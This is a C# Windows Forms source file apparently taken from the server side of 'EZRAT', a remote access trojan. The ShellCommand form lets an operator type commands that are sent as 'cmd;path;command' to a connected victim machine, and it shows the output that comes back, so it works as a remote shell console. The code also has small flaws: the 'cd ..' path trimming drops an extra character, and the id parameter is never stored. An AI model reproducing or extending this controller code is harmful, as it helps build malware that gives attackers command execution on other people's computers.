using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace EZRATServer.Forms
{
    public partial class ShellCommand : Form
    {

        private Server _baseWindows;

        public Server BaseWindows
        {
            get { return _baseWindows; }
            set { _baseWindows = value; }
        }

        private string _path;

        public string Path
        {
            get { return _path; }
            set { _path = value; }
        }

        private int _id;

        public int Id
        {
            get { return _id; }
            set { _id = value; }
        }



        public ShellCommand(Server parent, string path, int id)
        {
            this.BaseWindows = parent;
            this.Path = path;
            InitializeComponent();
            this.AddHeaderLine(path);
            this.tbxMessage.KeyDown += SendCmbCommand;
        }



        private void SendCmbCommand(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                this.AddCommandLine(this.tbxMessage.Text);
            }
        }



        private void AddHeaderLine(string path)
        {
            this.rtbText.Text += $"{path} > ";
        }

        private void AddCommandLine(string command)
        {
            if (command.StartsWith("cd "))
            {
                string tmp = command.Substring(3);
                if (tmp == "..")
                {
                    this.Path = this.Path.Substring(0, this.Path.LastIndexOf('\\') - 1);
                }
                else
                {
                    this.Path += tmp;
                }
            }
            this.BaseWindows.SendCommand("cmd;" + this.Path + ";" + command, this.Id);
            this.rtbText.Text += command + Environment.NewLine;
            this.tbxMessage.Clear();
            this.tbxMessage.Focus();
        }

        public void AddResultLine(string result)
        {
            this.tbxMessage.Invoke(new MethodInvoker(() =>
            {
                this.rtbText.Text += result + Environment.NewLine; this.AddHeaderLine(this.Path);
                this.rtbText.SelectionStart = this.rtbText.Text.Length;
                this.rtbText.ScrollToCaret();
            }));
        }
    }
}
